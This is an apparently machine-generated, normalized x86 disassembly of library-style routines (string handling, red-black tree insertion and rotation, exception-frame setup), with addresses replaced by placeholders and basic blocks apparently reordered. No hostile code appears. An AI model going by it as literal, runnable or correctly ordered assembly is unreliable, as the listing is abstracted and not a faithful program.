mov al 0x1
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] al
jne r-xdata
mov esi [ ebp ]
mov edi ecx
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] esi
test al al
je r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp + 0x34 ]
lea edx [ edi + 0xc ]
call sub_100094a0
test al al
je r-xdata
mov eax [ ebp + 0x18 ]
mov edi [ eax ]
test esi esi
je r-xdata
cmp [ edi + 0x24 ] 0x10
mov edx [ edi + 0x20 ]
mov [ esp + 0x10 ] edi
jb r-xdata
mov [ ebx + 0x4 ] edi
pop edi
mov [ ebx ] esi
pop esi
pop ebp
mov [ ebx + 0x8 ] 0x0
mov eax ebx
pop ebx
add esp 0x18
retn 0xc
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push edx
jmp r-xdata
call sub_1000d90c
mov ecx [ esp + 0x10 ]
cmp esi esi
je r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
push ebp
call sub_100091d0
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] 0x1
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0xc
lea esi [ esp + 0x20 ]
call sub_1000a0f0
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x34 ]
push edx
push 0x1
lea eax [ esp + 0x28 ]
push eax
cmp ecx edi
jne r-xdata
cmp ebp edx
jae r-xdata
mov ebp eax
mov ebp [ esp + 0x1c ]
cmp eax ebp
jae r-xdata
cmp [ esp + 0x20 ] 0x10
jb r-xdata
mov edx ebp
add esi 0x4
lea eax [ esi + 0x4 ]
mov esi [ eax ]
jmp r-xdata
test edx edx
je r-xdata
mov eax [ esi ]
cmp eax [ ecx ]
jne r-xdata
cmp edx 0x4
jb r-xdata
xor eax eax
movzx eax [ esi ]
movzx ebx [ ecx ]
sub eax ebx
jne r-xdata
sub edx 0x4
add ecx 0x4
add esi 0x4
cmp edx 0x4
jae r-xdata
setl al
mov [ esp + 0x14 ] al
test al al
je r-xdata
mov eax [ edi + 0x20 ]
cmp ebp eax
jae r-xdata
mov ebx [ esp + 0x30 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp edx 0x1
jbe r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
xor edx edx
cmp ebp eax
setne dl
mov eax edx
or eax 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
mov ebx [ esp + 0x30 ]
movzx eax [ esi + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x2c ]
mov ecx [ esp + 0x10 ]
cmp [ edi + 0x45 ] 0x0
je r-xdata
test eax eax
cmp edx 0x2
jbe r-xdata
movzx eax [ esi + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
cmp edx 0x3
jbe r-xdata
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10008d90
sub esp 0x18
push ebx
push ebp
mov ebp [ esp + 0x28 ]
push edi
mov ecx ebp
mov eax esi
call sub_100098f0
mov ebx eax
mov [ esp + 0x14 ] ebx
test esi esi
jne r-xdata
mov eax [ esi ]
mov edi [ esi + 0x18 ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
call sub_1000d90c
call sub_1000d90c
cmp eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] ecx
lea eax [ esp + 0x18 ]
lea eax [ ebx + 0xc ]
mov edx ebp
call sub_100094a0
test al al
jne r-xdata
cmp ebx edi
je r-xdata
lea eax [ esp + 0x10 ]
jmp r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + 0x4 ]
pop edi
pop ebp
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
add esp 0x18
retn 0x8
sub_10008e10
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_1000d90c
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x18 ]
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
add eax 0xc
retn
call sub_1000d90c
sub_10008e40
push 0xffffffff
push sub_1001dc78
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_10008f60
mov edx [ esp + 0x24 ]
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ esp + 0x18 ] ebx
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edx
mov [ ecx + 0x4 ] bl
call sub_10008f60
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0xc
sub_10008ed0
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax 0x1
ja r-xdata
push edi
mov edi [ esi + 0x14 ]
inc edi
cmp edi 0xfffffffe
jbe r-xdata
call sub_1001c70e
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_1001c70e
test edi edi
jne r-xdata
mov ecx [ esi + 0x14 ]
push ecx
push edi
mov ecx esi
call sub_10009c30
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
mov eax esi
pop edi
retn
mov edx 0x10
push ebp
mov ebp [ esi + 0x14 ]
lea eax [ esi + 0x4 ]
cmp [ esi + 0x18 ] edx
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ eax ] 0x0
mov eax esi
pop edi
retn
mov eax [ esi + 0x4 ]
mov [ eax ] 0x0
mov eax esi
pop edi
retn
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ eax + edi ] 0x0
mov eax [ eax ]
mov [ ecx + ebp ] bl
mov [ esi + 0x14 ] edi
pop ebp
cmp [ esi + 0x18 ] edx
jb r-xdata
sub_10008f60
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x1c ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_1001c746
cmp esi ebx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebp
push edi
mov ecx esi
call sub_10009710
push ebp
push 0x0
mov ecx esi
call sub_10009710
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_1001c70e
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_10009c30
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
lea edx [ ebx + 0x4 ]
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
push edi
add edx ebp
push edx
push ecx
push eax
call sub_1000db5a
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_10009040
mov ecx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0x14 ]
test edi edi
jbe r-xdata
xor eax eax
pop ebp
retn 0xc
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn 0xc
cmp ecx edi
ja r-xdata
mov edx 0x1
sub edx ecx
add edi edx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea ebx [ eax + 0x4 ]
mov [ esp + 0x18 ] ebx
mov ebx [ eax + 0x4 ]
add eax 0x4
mov [ esp + 0x18 ] eax
jmp r-xdata
lea esp [ esp ]
movsx eax [ ebp ]
push edi
push eax
push ebx
call sub_1000d530
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov edx [ esp + 0x14 ]
cmp [ edx + 0x18 ] 0x10
jb r-xdata
movsx ecx [ ebp ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push ecx
lea ebx [ esi + 0x1 ]
push ebx
call sub_1000d530
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ esp + 0x18 ]
pop edi
mov eax esi
pop esi
pop ebx
sub eax ecx
pop ebp
retn 0xc
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
pop edi
mov eax esi
pop esi
pop ebx
sub eax ecx
pop ebp
retn 0xc
mov eax [ esp + 0x1c ]
mov ecx ebp
mov edx esi
call sub_100023d0
test eax eax
je r-xdata
sub_10009110
push 0xffffffff
push sub_1001dcc8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_1000cafd
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_1000a0b0
mov [ esi + 0x18 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x1c ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_10009190
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x45 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_10009190
mov esi [ esi ]
lea ecx [ edi + 0xc ]
push ecx
call sub_10004100
push edi
call sub_1000c4b4
add esp 0x4
cmp [ esi + 0x45 ] 0x0
mov edi esi
je r-xdata
sub_100091d0
push 0xffffffff
push sub_1001de48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebp [ esp + 0x68 ]
cmp [ ebp + 0x1c ] 0x4924923
jb r-xdata
mov edx [ esp + 0x74 ]
mov eax [ ebp + 0x18 ]
push edx
push eax
push esi
push eax
call sub_10009aa0
mov ecx [ ebp + 0x18 ]
mov edx eax
mov eax 0x1
add [ ebp + 0x1c ] eax
xor ebx ebx
mov [ esp + 0x68 ] edx
cmp esi ecx
jne r-xdata
push 0x13
xor ebx ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_10009630
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] ebx
call sub_10002450
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_10011014
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x18 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x18 ]
jmp r-xdata
mov [ esi + 0x8 ] edx
mov ecx [ ebp + 0x18 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ esi ] edx
mov ecx [ ebp + 0x18 ]
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x8 ] edx
mov esi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
cmp [ esi + 0x44 ] bl
jne r-xdata
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x44 ] al
mov ecx [ esp + 0x6c ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp ]
mov [ ecx ] edx
mov eax ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
mov esi [ ecx ]
mov edi [ esi + 0x4 ]
cmp esi [ edi ]
jne r-xdata
mov edi [ edi ]
cmp [ edi + 0x44 ] bl
jne r-xdata
mov edi [ edi + 0x8 ]
cmp [ edi + 0x44 ] bl
je r-xdata
cmp edx [ esi ]
jne r-xdata
mov edx esi
mov [ edx + 0x44 ] al
mov [ edi + 0x44 ] al
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x44 ] bl
mov ecx [ ecx ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
cmp edx [ esi + 0x8 ]
jne r-xdata
mov esi [ ecx ]
mov [ esi + 0x44 ] al
mov esi [ ecx ]
mov esi [ esi + 0x4 ]
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edi [ esi ]
mov [ ecx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x45 ] bl
jne r-xdata
mov edx esi
mov esi [ edx ]
mov ecx [ esi + 0x8 ]
mov [ edx ] ecx
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
mov esi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
cmp [ esi + 0x44 ] bl
je r-xdata
mov esi [ ecx ]
mov [ esi + 0x44 ] al
mov esi [ ecx ]
mov esi [ esi + 0x4 ]
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov esi [ ecx ]
mov edi [ esi + 0x8 ]
mov [ ecx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x45 ] bl
jne r-xdata
mov edx esi
mov esi [ edx + 0x8 ]
mov ecx [ esi ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
mov edi [ ecx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov edx [ esp + 0x68 ]
mov edi [ ecx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov edi [ ecx + 0x4 ]
cmp ecx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov edi [ ecx ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov edi [ ecx ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] ecx
mov [ edi ] esi
mov [ edi + 0x8 ] esi
jmp r-xdata
mov [ esi + 0x8 ] edx
mov [ ecx ] esi
mov [ edi ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov [ ecx + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ ecx ] esi
sub_10009460
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
sub esp 0x8
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_100097a0
mov ecx [ esi + 0x18 ]
push ecx
call sub_1000c4b4
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_100094a0
cmp [ eax + 0x18 ] 0x10
push esi
push edi
mov edi [ eax + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
cmp [ edx + 0x18 ] 0x10
jb r-xdata
mov eax edi
mov esi [ edx + 0x14 ]
mov eax esi
cmp esi edi
jb r-xdata
add edx 0x4
mov edx [ edx + 0x4 ]
jmp r-xdata
xor ecx ecx
test eax eax
setl cl
pop edi
mov al cl
pop esi
retn
cmp esi edi
jae r-xdata
call sub_100023d0
test eax eax
jne r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
xor ecx ecx
test eax eax
setl cl
pop edi
mov al cl
pop esi
retn
sub_10009520
mov ecx [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x14 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebp
jbe r-xdata
mov edi [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edi 0x10
jb r-xdata
call sub_1001c70e
lea edx [ eax + ebp ]
cmp edx eax
jae r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
test ebp ebp
jbe r-xdata
cmp edi 0x10
jb r-xdata
cmp ecx edx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov edi [ esi + 0x14 ]
add edi ebp
cmp edi 0xfffffffe
jbe r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_1001c70e
cmp edi 0x10
jb r-xdata
mov ebx [ esi + 0x14 ]
add ebx edx
cmp ebx ecx
jbe r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_10009c30
test edi edi
sub ecx eax
push ecx
push esi
mov eax ebp
call sub_10009b40
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ eax ]
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov edx ebx
mov edx [ ebx ]
jmp r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
mov ecx [ esi + 0x14 ]
push ebp
mov ebp [ esp + 0x18 ]
sub eax ecx
push ebp
push eax
add ecx edx
push ecx
call sub_1000db5a
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_10009630
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov esi ecx
test ebp ebp
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0xfffffffe
jbe r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_1001c70e
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x14 ]
push edx
push edi
mov ecx esi
call sub_10009c30
test edi edi
cmp edx 0x10
jb r-xdata
cmp ebp ecx
jb r-xdata
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x14 ]
add edi ecx
cmp edi ebp
jbe r-xdata
mov [ ebx + edi ] 0x0
pop ebx
mov ebx [ ebx ]
push edi
push ebp
push ecx
push eax
call sub_1000db5a
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
sub ebp eax
push ebp
push esi
mov ecx esi
call sub_10008f60
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ eax ]
sub_10009710
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
mov edi [ esp + 0x14 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_1001c746
test edi edi
jbe r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ esp + 0x14 ] ebp
mov edx [ ebp ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ eax + ebp ] 0x0
pop ebp
mov ebp [ ebp ]
sub eax edi
push eax
mov eax [ esp + 0x18 ]
add eax ebx
add eax edi
push eax
sub ecx ebx
push ecx
add edx ebx
push edx
call sub_1000d0cd
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] eax
jb r-xdata
sub_100097a0
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
push edi
mov edi [ eax ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
call sub_1000d90c
mov eax [ esp + 0x20 ]
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
mov ebx [ esp + 0x28 ]
mov edi [ esi + 0x18 ]
mov edx [ esi ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x24 ]
cmp ecx edi
jne r-xdata
call sub_1000d90c
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x28 ]
je r-xdata
call sub_1000d90c
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
cmp ebx edx
je r-xdata
mov esi [ esi ]
pop edi
mov [ ebp ] esi
pop esi
mov eax ebp
mov [ ebp + 0x4 ] ecx
pop ebp
pop ebx
add esp 0x8
retn 0x14
mov edi eax
mov ebx ecx
test eax eax
jne r-xdata
cmp ecx [ esp + 0x2c ]
je r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx esi
call sub_10009190
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
mov edx [ esi ]
mov [ ebp ] edx
mov eax ebp
mov [ ebp + 0x4 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
cmp [ esp + 0x2c ] edi
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
je r-xdata
call sub_1000d90c
mov ecx [ esp + 0x24 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
call sub_1000d90c
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
push ebx
push edi
lea eax [ esp + 0x18 ]
push eax
push esi
call sub_10009db0
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
jmp r-xdata
mov [ esp + 0x24 ] eax
nop
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx eax
mov [ esp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
sub_100098f0
sub esp 0x10
mov eax [ eax + 0x18 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x45 ] 0x0
mov [ esp + 0x8 ] eax
jne r-xdata
pop ebx
add esp 0x10
retn
mov eax [ ecx + 0x14 ]
mov edx [ ecx + 0x18 ]
push ebp
push esi
add ecx 0x4
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov edi 0x10
cmp [ esp + 0x1c ] edi
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi ebp
cmp ebp eax
jb r-xdata
mov ebp [ ebx + 0x20 ]
mov ecx ebp
cmp ecx ebp
jae r-xdata
cmp [ ebx + 0x24 ] edi
jb r-xdata
mov esi eax
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
lea ebx [ ebx ]
cmp esi 0x4
jb r-xdata
xor ecx ecx
movzx ecx [ edi ]
movzx eax [ edx ]
sub ecx eax
jne r-xdata
sub esi 0x4
add edx 0x4
add edi 0x4
cmp esi 0x4
jae r-xdata
jge r-xdata
cmp ebp eax
jb r-xdata
mov eax [ esp + 0x10 ]
sar ecx 0x1f
or ecx 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov ecx [ edi ]
cmp ecx [ edx ]
jne r-xdata
mov [ esp + 0x14 ] ebx
mov ebx [ ebx ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
cmp ebp eax
setne cl
test ecx ecx
test ecx ecx
jne r-xdata
mov eax [ esp + 0x10 ]
movzx ecx [ edi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub ecx eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
cmp [ ebx + 0x45 ] 0x0
je r-xdata
cmp esi 0x2
jbe r-xdata
movzx ecx [ edi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub ecx eax
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx ecx [ edi + 0x3 ]
movzx edx [ edx + 0x3 ]
sub ecx edx
sub_10009a00
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_10009a50
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
